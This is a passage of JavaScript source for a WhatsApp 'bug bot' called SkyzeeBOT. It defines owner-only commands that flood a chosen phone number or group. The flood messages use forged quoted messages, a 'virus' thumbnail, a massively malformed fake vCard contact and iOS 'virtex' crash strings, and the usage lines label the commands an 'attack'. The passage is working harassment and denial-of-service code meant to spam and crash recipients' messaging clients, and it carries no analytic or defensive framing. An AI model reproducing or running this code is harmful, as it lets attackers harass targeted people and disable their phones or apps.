            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            reply(mess.success)
            break
                   case 'pcgcfast':               
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
             pcgcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            break
case 'gcbunny': {            
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             bunnygcxez = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             bunnygcxeon13 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            }
            break
          case 'pcbunny': { 
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`)
             rabbitxeon = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             rabbitbugxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            }
            break 
                      case 'pcgcbunny': {            
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxxx`)
             bunnypcgcx = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`

             xeonpcgcbunny = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await SkyzeeBOT.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            }
            break
 case 'xcrasher':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
SkyzeeBOT.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
SkyzeeBOT.sendContact(m.chat, global.owner, fakeContacts)
}
}
break
case 'iosvirtex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
SkyzeeBOT.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
}
}
break
case 'iosvirtex5': {
           	
